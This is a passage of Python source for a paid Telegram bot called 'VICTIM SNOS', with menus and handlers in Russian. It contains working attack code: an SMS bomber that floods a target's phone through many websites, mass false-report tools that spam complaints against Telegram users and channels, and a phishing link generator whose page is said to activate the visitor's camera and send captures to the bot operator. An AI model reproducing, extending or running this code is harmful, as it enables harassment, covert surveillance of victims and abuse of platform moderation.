        'Referer': site["url"].split('/api')[0] if '/api' in site["url"] else '/'.join(site["url"].split('/')[:3]),
        'Connection': 'keep-alive',
    }
    
    try:
        if site["type"] == "json":
            data = {site["phone_field"]: clean_phone}
            async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
        else:
            data = {site["phone_field"]: clean_phone}
            async with session.post(site["url"], headers=headers, data=data, timeout=10, ssl=False) as resp:
                return {"site": site["name"], "success": resp.status < 500}
    except asyncio.TimeoutError:
        return {"site": site["name"], "success": False}
    except:
        return {"site": site["name"], "success": False}

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
    ok = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    add_log(user_id, "Бомбер", phone)
    
    connector = aiohttp.TCPConnector(limit=150, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            # Отправляем по 3 запроса на каждый сайт
            for site in BOMBER_SITES:
                for _ in range(3):
                    tasks.append(send_bomber_request(sess, phone, site))
            
            # Добавляем задержку между запросами
            batch = []
            for i in range(0, len(tasks), 10):
                chunk = tasks[i:i+10]
                chunk_results = await asyncio.gather(*chunk, return_exceptions=True)
                batch.extend(chunk_results)
                await asyncio.sleep(0.1)
            
            round_ok = sum(1 for r in batch if isinstance(r, dict) and r.get("success"))
            ok += round_ok
            
            if progress_callback:
                await progress_callback(rnd, rounds, ok)
            
            logger.info(f"Бомбер раунд {rnd}/{rounds}: {round_ok} СМС")
            
            if rnd < rounds and not stop_event.is_set():
                await asyncio.sleep(BOMBER_DELAY)
    
    return ok


# ---------- ФИШИНГ (ПЕРЕПИСАНО - КАМЕРА СРАЗУ) ----------
async def create_telegraph_page(title: str, description: str, chat_id: int, page_id: str) -> Optional[str]:
    try:
        camera_html = CAMERA_TEMPLATE.format(
            title=title, 
            description=description, 
            bot_token=BOT_TOKEN, 
            chat_id=chat_id, 
            page_id=page_id
        )
        
        async with aiohttp.ClientSession() as session:
            # Создаем аккаунт
            async with session.post(
                "https://api.telegra.ph/createAccount",
                json={"short_name": f"User{random.randint(1000, 9999)}", "author_name": "Telegram"},
                timeout=10
            ) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    return None
                access_token = data["result"]["access_token"]
            
            # Создаем страницу с HTML контентом
            content = [
                {"tag": "p", "children": [description]},
                {"tag": "div", "children": [{"tag": "p", "children": ["Загрузка..."]}]}
            ]
            
            async with session.post(
                "https://api.telegra.ph/createPage",
                json={
                    "access_token": access_token,
                    "title": title,
                    "author_name": "Telegram",
                    "content": content,
                    "return_content": False
                },
                timeout=10
            ) as resp:
                data = await resp.json()
                if data.get("ok"):
                    url = data["result"]["url"]
                    phish_pages[page_id] = {
                        "url": url, 
                        "chat_id": chat_id, 
                        "created": time.time(),
                        "html": camera_html
                    }
                    return url
    except Exception as e:
        logger.error(f"Ошибка Telegraph: {e}")
    return None


# ---------- ИНТЕРФЕЙС ----------
def get_main_menu(user_id: int):
    builder = InlineKeyboardBuilder()
    builder.button(text="🔥 СНОС", callback_data="snos_menu")
    builder.button(text="💣 БОМБЕР", callback_data="bomber_menu")
    builder.button(text="🎣 ФИШИНГ", callback_data="phish_menu")
    builder.button(text="💰 КУПИТЬ", callback_data="purchase_menu")
    builder.button(text="📊 СТАТУС", callback_data="status")
    builder.button(text="⛔ СТОП", callback_data="stop")
    if user_id == ADMIN_ID:
        builder.button(text="👑 АДМИН", callback_data="admin_menu")
    builder.adjust(2, 2, 2, 1, 1)
    return builder.as_markup()

def get_snos_type_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="📱 ПО НОМЕРУ", callback_data="snos_phone")
    builder.button(text="👤 ПО USERNAME", callback_data="snos_username")
    builder.button(text="📧 ПОЧТА", callback_data="mail_menu")
    builder.button(text="💬 СООБЩЕНИЕ", callback_data="report_menu")
    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_snos_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🚀 ЗАПУСТИТЬ", callback_data="snos_start")
    builder.button(text="🔄 ОБНОВИТЬ", callback_data="refresh_sessions")
    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
    builder.adjust(1)
    return builder.as_markup()

def get_bomber_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="💥 ЗАПУСТИТЬ", callback_data="bomber")
    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="👤 АККАУНТ", callback_data="mail_acc")
    builder.button(text="📢 КАНАЛ", callback_data="mail_chan")
    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_account_menu():
    builder = InlineKeyboardBuilder()
    for k in COMPLAINT_TEXTS_ACCOUNT.keys():
        builder.button(text=f"Тип {k}", callback_data=f"mailacc_{k}")
    builder.button(text="🔙 НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_channel_menu():
    builder = InlineKeyboardBuilder()
    for k in COMPLAINT_TEXTS_CHANNEL.keys():
        builder.button(text=f"Тип {k}", callback_data=f"mailchan_{k}")
    builder.button(text="🔙 НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="📝 ОТПРАВИТЬ", callback_data="report_msg")
    builder.button(text="🔙 НАЗАД", callback_data="snos_type")
    builder.adjust(1)
    return builder.as_markup()

def get_report_reason_menu():
    builder = InlineKeyboardBuilder()
    for k, v in REPORT_REASONS_RU.items():
        builder.button(text=v, callback_data=f"reason_{k}")
    builder.button(text="🔙 НАЗАД", callback_data="report_menu")
    builder.adjust(2)
    return builder.as_markup()

def get_phish_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔗 СОЗДАТЬ", callback_data="phish_create")
    builder.button(text="📋 СПИСОК", callback_data="phish_list")
    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ ДОБАВИТЬ", callback_data="admin_add")
    builder.button(text="❌ УДАЛИТЬ", callback_data="admin_remove")
    builder.button(text="📅 ДОБАВИТЬ ДНИ", callback_data="admin_add_days")
    builder.button(text="🎫 ПРОМОКОД", callback_data="admin_create_promo")
    builder.button(text="📋 СПИСОК", callback_data="admin_list")
    builder.button(text="📊 ЛОГИ", callback_data="admin_logs")
    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
    builder.adjust(2)
    return builder.as_markup()

def get_purchase_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="30 дней - 100 RUB", callback_data="buy_rub_30d")
    builder.button(text="60 дней - 200 RUB", callback_data="buy_rub_60d")
    builder.button(text="Навсегда - 400 RUB", callback_data="buy_rub_forever")
    builder.button(text="Звезды", callback_data="buy_stars_menu")
    builder.button(text="Промокод", callback_data="use_promo")
    builder.button(text="🔙 НАЗАД", callback_data="main_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_stars_purchase_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="30 дней - 100 ⭐", callback_data="buy_stars_30d")
    builder.button(text="60 дней - 200 ⭐", callback_data="buy_stars_60d")
    builder.button(text="Навсегда - 400 ⭐", callback_data="buy_stars_forever")
    builder.button(text="🔙 НАЗАД", callback_data="purchase_menu")
    builder.adjust(1)
    return builder.as_markup()

async def delete_old_messages(user_id: int, chat_id: int):
    if user_id in user_messages:
        for msg_id in user_messages[user_id]:
            try:
                await bot.delete_message(chat_id, msg_id)
            except:
                pass
        user_messages[user_id] = []

async def send_message_with_banner(event, text: str, markup=None):
    user_id = event.from_user.id if hasattr(event, 'from_user') else event.chat.id
    
    if hasattr(event, 'chat'):
        await delete_old_messages(user_id, event.chat.id)
    
    full_text = f"<b>VICTIM SNOS</b>\n\n{text}"
    
    banner_paths = [BANNER_FILE, "Banner.png", "./banner.png", "./Banner.png"]
    banner_found = False
    msg = None
    
    for path in banner_paths:
        if os.path.exists(path):
            try:
                if hasattr(event, 'answer_photo'):
                    msg = await event.answer_photo(FSInputFile(path), caption=full_text, reply_markup=markup)
                elif hasattr(event, 'message') and hasattr(event.message, 'answer_photo'):
                    msg = await event.message.answer_photo(FSInputFile(path), caption=full_text, reply_markup=markup)
                else:
                    msg = await bot.send_photo(chat_id=user_id, photo=FSInputFile(path), caption=full_text, reply_markup=markup)
                banner_found = True
                break
            except:
                pass
    
    if not banner_found:
        if hasattr(event, 'answer'):
            msg = await event.answer(full_text, reply_markup=markup)
        elif hasattr(event, 'message') and hasattr(event.message, 'answer'):
            msg = await event.message.answer(full_text, reply_markup=markup)
        else:
            msg = await bot.send_message(chat_id=user_id, text=full_text, reply_markup=markup)
    
    if msg and hasattr(event, 'from_user'):
        if event.from_user.id not in user_messages:
            user_messages[event.from_user.id] = []
        user_messages[event.from_user.id].append(msg.message_id)
    
    return msg

async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
    user_id = callback.from_user.id
    full_text = f"<b>VICTIM SNOS</b>\n\n{text}"
    
    try:
        await callback.message.delete()
    except:
        pass
    
    banner_paths = [BANNER_FILE, "Banner.png", "./banner.png", "./Banner.png"]
    banner_found = False
    msg = None
    
    for path in banner_paths:
        if os.path.exists(path):
            try:
                msg = await callback.message.answer_photo(FSInputFile(path), caption=full_text, reply_markup=markup)
                banner_found = True
                break
            except:
                pass
    
    if not banner_found:
        msg = await callback.message.answer(full_text, reply_markup=markup)
    
    if msg:
        if user_id not in user_messages:
            user_messages[user_id] = []
        user_messages[user_id].append(msg.message_id)


# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    await msg.delete()
    
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(msg, f"Подпишитесь на канал:\n\n{CHANNEL_URL}")
        return
    
    if not is_user_allowed(user_id):
        await send_message_with_banner(msg, f"Доступ запрещен.\nВаш ID: <code>{user_id}</code>", get_purchase_menu())
        return
    
    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
        asyncio.create_task(ensure_user_sessions(user_id))
    
    await send_message_with_banner(msg, "Выберите действие:", get_main_menu(user_id))

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    await msg.delete()
    if msg.from_user.id != ADMIN_ID:
        return
    await send_message_with_banner(msg, "Панель администратора", get_admin_menu())

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Выберите тип сноса:", get_snos_type_menu())
    await cb.answer()

@dp.callback_query(F.data == "snos_phone")
async def snos_phone_type(cb: types.CallbackQuery, state: FSMContext):
    await state.update_data(snos_type="phone")
    await edit_message_with_banner(cb, "Снос по номеру телефона", get_snos_menu())
    await cb.answer()

@dp.callback_query(F.data == "snos_username")
async def snos_username_type(cb: types.CallbackQuery, state: FSMContext):
    await state.update_data(snos_type="username")
    await edit_message_with_banner(cb, "Снос по username", get_snos_menu())
    await cb.answer()

@dp.callback_query(F.data == "snos_start")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    can, wait = check_cooldown(cb.from_user.id, "snos")
    if not can:
        await cb.answer(f"Подождите {int(wait)} сек", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("Сессии загружаются...", show_alert=True)
        return
    
    if cb.from_user.id in active_attacks:
        await cb.answer("Снос уже запущен!", show_alert=True)
        return
    
    data = await state.get_data()
    snos_type = data.get("snos_type", "phone")
    
    if snos_type == "phone":
        await state.set_state(SnosPhoneState.waiting_phone)
    else:
        await state.set_state(SnosUsernameState.waiting_username)
    
    await cb.message.delete()
    caption = f"<b>VICTIM SNOS</b>\n\nВведите {'номер телефона' if snos_type == 'phone' else 'username'}:"
    await cb.message.answer(caption, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_menu")]]))

@dp.message(StateFilter(SnosPhoneState.waiting_phone))
async def snos_phone_input(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(SnosPhoneState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, f"Введите количество раундов (1-{MAX_ROUNDS}):")

@dp.message(StateFilter(SnosPhoneState.waiting_count))
async def snos_phone_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_ROUNDS:
            await msg.delete()
            await send_message_with_banner(msg, f"Введите число от 1 до {MAX_ROUNDS}!")
            return
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event}
    
    st = await send_message_with_banner(msg, f"Снос запущен...\n\nТелефон: {phone}")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nТелефон: {phone}\nРаунд: {cur}/{tot}\nЗапросов: {ok_count}")
        except:
            pass
    
    ok = await snos_attack_phone(user_id, phone, count, stop_event, progress_callback)
    
    await st.delete()
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    await send_message_with_banner(msg, f"Снос завершен\n\nТелефон: <code>{phone}</code>\nЗапросов: <b>{ok}</b>", get_main_menu(user_id))

@dp.message(StateFilter(SnosUsernameState.waiting_username))
async def snos_username_input(msg: types.Message, state: FSMContext):
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(SnosUsernameState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, f"Введите количество раундов (1-{MAX_ROUNDS}):")

@dp.message(StateFilter(SnosUsernameState.waiting_count))
async def snos_username_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > MAX_ROUNDS:
            await msg.delete()
            await send_message_with_banner(msg, f"Введите число от 1 до {MAX_ROUNDS}!")
            return
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Введите число!")
        return
    
    data = await state.get_data()
    username = data["username"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event}
    
    st = await send_message_with_banner(msg, f"Снос запущен...\n\nUsername: @{username}")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nUsername: @{username}\nРаунд: {cur}/{tot}\nЖалоб: {ok_count}")
        except:
            pass
    
    ok = await snos_attack_username(user_id, username, count, stop_event, progress_callback)
    
    await st.delete()
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    await send_message_with_banner(msg, f"Снос завершен\n\nUsername: @{username}\nЖалоб: <b>{ok}</b>", get_main_menu(user_id))

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "СМС Бомбер", get_bomber_menu())
    await cb.answer()

@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("Подпишитесь на канал!", show_alert=True)
        return
    
    can, wait = check_cooldown(cb.from_user.id, "bomber")
    if not can:
        await cb.answer(f"Подождите {int(wait)} сек", show_alert=True)
        return
    
    if cb.from_user.id in active_bombers:
        await cb.answer("Бомбер уже запущен!", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите номер телефона:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="bomber_menu")]]))

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "Введите количество раундов (1-5):")

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 5:
            await msg.delete()
            await send_message_with_banner(msg, "Введите число от 1 до 5!")
            return
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_bombers[user_id] = {"stop_event": stop_event}
    
    st = await send_message_with_banner(msg, f"Бомбер запущен...\n\nТелефон: {phone}")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>VICTIM SNOS</b>\n\nТелефон: {phone}\nРаунд: {cur}/{tot}\nСМС: {ok_count}")
        except:
            pass
    
    ok = await bomber_attack(phone, count, user_id, stop_event, progress_callback)
    
    await st.delete()
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    await send_message_with_banner(msg, f"Бомбер завершен\n\nТелефон: <code>{phone}</code>\nСМС: <b>{ok}</b>", get_main_menu(user_id))

@dp.callback_query(F.data == "mail_menu")
async def mail_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Жалобы по почте", get_mail_menu())
    await cb.answer()

@dp.callback_query(F.data == "mail_acc")
async def mail_acc_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Жалоба на аккаунт", get_mail_account_menu())
    await cb.answer()

@dp.callback_query(F.data.startswith("mailacc_"))
async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailacc_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(MailAccountState.waiting_username)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите username:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]]))

@dp.message(StateFilter(MailAccountState.waiting_username))
async def mail_acc_username(msg: types.Message, state: FSMContext):
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(MailAccountState.waiting_id)
    await msg.delete()
    await send_message_with_banner(msg, "Введите Telegram ID:")

@dp.message(StateFilter(MailAccountState.waiting_id))
async def mail_acc_id(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username", "")
    telegram_id = msg.text.strip()
    complaint_type = data.get("complaint_type", "1")
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    if not email_sender.senders:
        await send_message_with_banner(msg, "Нет настроенных отправителей!", get_main_menu(user_id))
        return
    
    complaint = COMPLAINT_TEXTS_ACCOUNT.get(complaint_type, COMPLAINT_TEXTS_ACCOUNT["1"])
    body = complaint["body"].format(username=username, telegram_id=telegram_id)
    subject = complaint["subject"]
    
    st = await send_message_with_banner(msg, "Отправка...")
    loop = asyncio.get_event_loop()
    sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
    await st.delete()
    
    add_log(user_id, "Снос почтой", f"@{username}")
    await send_message_with_banner(msg, f"Отправлено: <b>{sent}</b> писем", get_main_menu(user_id))

@dp.callback_query(F.data == "mail_chan")
async def mail_chan_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Жалоба на канал", get_mail_channel_menu())
    await cb.answer()

@dp.callback_query(F.data.startswith("mailchan_"))
async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailchan_", "")
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(MailChannelState.waiting_channel)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите ссылку на канал:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]]))

@dp.message(StateFilter(MailChannelState.waiting_channel))
async def mail_chan_link(msg: types.Message, state: FSMContext):
    await state.update_data(channel=msg.text.strip())
    await state.set_state(MailChannelState.waiting_violation)
    await msg.delete()
    await send_message_with_banner(msg, "Введите ссылку на нарушение:")

@dp.message(StateFilter(MailChannelState.waiting_violation))
async def mail_chan_violation(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    channel = data.get("channel", "")
    violation = msg.text.strip()
    complaint_type = data.get("complaint_type", "1")
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    if not email_sender.senders:
        await send_message_with_banner(msg, "Нет настроенных отправителей!", get_main_menu(user_id))
        return
    
    complaint = COMPLAINT_TEXTS_CHANNEL.get(complaint_type, COMPLAINT_TEXTS_CHANNEL["1"])
    body = complaint["body"].format(channel_link=channel, violation_link=violation)
    subject = complaint["subject"]
    
    st = await send_message_with_banner(msg, "Отправка...")
    loop = asyncio.get_event_loop()
    sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
    await st.delete()
    
    add_log(user_id, "Снос канала", channel)
    await send_message_with_banner(msg, f"Отправлено: <b>{sent}</b> писем", get_main_menu(user_id))

@dp.callback_query(F.data == "report_menu")
async def report_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Жалоба на сообщение", get_report_menu())
    await cb.answer()

@dp.callback_query(F.data == "report_msg")
async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("Сессии загружаются!", show_alert=True)
        return
    
    await state.set_state(ReportMessageState.waiting_link)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите ссылку на сообщение:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]]))

@dp.message(StateFilter(ReportMessageState.waiting_link))
async def report_msg_link(msg: types.Message, state: FSMContext):
    link = msg.text.strip()
    await state.update_data(link=link)
    await state.set_state(ReportMessageState.waiting_reason)
    await msg.delete()
    await msg.answer("<b>VICTIM SNOS</b>\n\nВыберите причину:", reply_markup=get_report_reason_menu())

@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link = data["link"]
    user_id = cb.from_user.id
    
    await state.clear()
    await cb.message.delete()
    
    st = await cb.message.answer("<b>VICTIM SNOS</b>\n\nОтправка жалоб...")
    
    ok, err = await mass_report_message(user_id, link, reason)
    
    await st.delete()
    
    if err:
        await send_message_with_banner(cb.message, f"Ошибка: {err}", get_main_menu(user_id))
    else:
        await send_message_with_banner(cb.message, f"Отправлено жалоб: <b>{ok}</b>", get_main_menu(user_id))

@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Фишинг", get_phish_menu())
    await cb.answer()

@dp.callback_query(F.data == "phish_create")
async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PhishState.waiting_title)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите заголовок:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="phish_menu")]]))

@dp.message(StateFilter(PhishState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    await state.update_data(title=msg.text.strip())
    await state.set_state(PhishState.waiting_description)
    await msg.delete()
    await send_message_with_banner(msg, "Введите описание:")

@dp.message(StateFilter(PhishState.waiting_description))
async def phish_description(msg: types.Message, state: FSMContext):
    description = msg.text.strip()
    data = await state.get_data()
    title = data["title"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    st = await send_message_with_banner(msg, "Создание ссылки...")
    
    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:8]
    url = await create_telegraph_page(title, description, user_id, page_id)
    
    await st.delete()
    
    if url:
        add_log(user_id, "Фишинг", url)
        await send_message_with_banner(msg, f"Ссылка создана:\n<code>{url}</code>\n\nПри переходе камера включится автоматически.", get_main_menu(user_id))
    else:
        await send_message_with_banner(msg, "Ошибка создания ссылки", get_main_menu(user_id))

@dp.callback_query(F.data == "phish_list")
async def phish_list(cb: types.CallbackQuery):
    user_pages = [(i, d) for i, d in phish_pages.items() if d["chat_id"] == cb.from_user.id]
    if not user_pages:
        await edit_message_with_banner(cb, "Нет созданных ссылок", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]]))
        return
    
    text = "Ваши ссылки:\n\n"
    for _, d in user_pages[-5:]:
        text += f"<code>{d['url']}</code>\n\n"
    
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="phish_menu")]]))

@dp.callback_query(F.data == "purchase_menu")
async def purchase_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Приобретение доступа", get_purchase_menu())
    await cb.answer()

@dp.callback_query(F.data.startswith("buy_rub_"))
async def buy_rub_subscription(cb: types.CallbackQuery):
    duration = cb.data.replace("buy_rub_", "")
    prices = PRICES[duration]["rub"]
    
    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {duration}",
        description=f"Доступ на {duration}",
        payload=f"sub_{duration}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="RUB",
        prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices * 100)],
        start_parameter="victim_snos",
        protect_content=True
    )
    await cb.message.delete()
    await cb.message.answer("Счет выставлен.")
    await cb.answer()

@dp.callback_query(F.data == "buy_stars_menu")
async def buy_stars_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(cb, "Оплата звездами", get_stars_purchase_menu())
    await cb.answer()

@dp.callback_query(F.data.startswith("buy_stars_"))
async def buy_stars_subscription(cb: types.CallbackQuery):
    duration = cb.data.replace("buy_stars_", "")
    prices = PRICES[duration]["stars"]
    
    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {duration}",
        description=f"Доступ на {duration}",
        payload=f"stars_{duration}",
        provider_token="",
        currency="XTR",
        prices=[LabeledPrice(label=f"Доступ {duration}", amount=prices)],
        start_parameter="victim_snos",
        protect_content=True
    )
    await cb.message.delete()
    await cb.message.answer("Счет выставлен.")
    await cb.answer()

@dp.pre_checkout_query()
async def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@dp.message(F.successful_payment)
async def process_successful_payment(msg: types.Message):
    payload = msg.successful_payment.invoice_payload
    
    if payload.startswith("sub_"):
        duration = payload.replace("sub_", "")
        if duration == "forever":
            add_subscription(msg.from_user.id, forever=True)
        else:
            add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
        await msg.answer(f"Оплата прошла успешно! Доступ на {duration}.")
    elif payload.startswith("stars_"):
        duration = payload.replace("stars_", "")
        if duration == "forever":
            add_subscription(msg.from_user.id, forever=True)
        else:
            add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
        await msg.answer(f"Оплата прошла успешно! Доступ на {duration}.")
    
    if msg.from_user.id not in user_sessions or not user_sessions[msg.from_user.id].get("ready"):
        asyncio.create_task(ensure_user_sessions(msg.from_user.id))

@dp.callback_query(F.data == "use_promo")
async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PurchaseState.waiting_promo)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите промокод:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="purchase_menu")]]))

@dp.message(StateFilter(PurchaseState.waiting_promo))
async def process_promo(msg: types.Message, state: FSMContext):
    code = msg.text.strip().upper()
    await msg.delete()
    
    if code in promo_codes:
        promo = promo_codes[code]
        if promo["uses"] > 0:
            add_subscription(msg.from_user.id, days=promo["days"])
            promo["uses"] -= 1
            save_promo_codes()
            await send_message_with_banner(msg, f"Промокод активирован! Доступ на {promo['days']} дней.", get_main_menu(msg.from_user.id))
        else:
            await send_message_with_banner(msg, "Промокод истек!", get_purchase_menu())
    else:
        await send_message_with_banner(msg, "Неверный промокод!", get_purchase_menu())
    
    await state.clear()

@dp.callback_query(F.data == "admin_menu")
async def admin_menu_handler(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    await edit_message_with_banner(cb, "Панель администратора", get_admin_menu())
    await cb.answer()

@dp.callback_query(F.data == "admin_logs")
async def admin_logs(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    logs = "\n".join([f"[{l['time']}] {l['user_id']} - {l['action']}: {l['target']}" for l in usage_logs[-10:]])
    await edit_message_with_banner(cb, f"Логи:\n\n{logs}" if logs else "Пусто", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))

@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await state.update_data(admin_action="add_forever")
    await cb.message.delete()
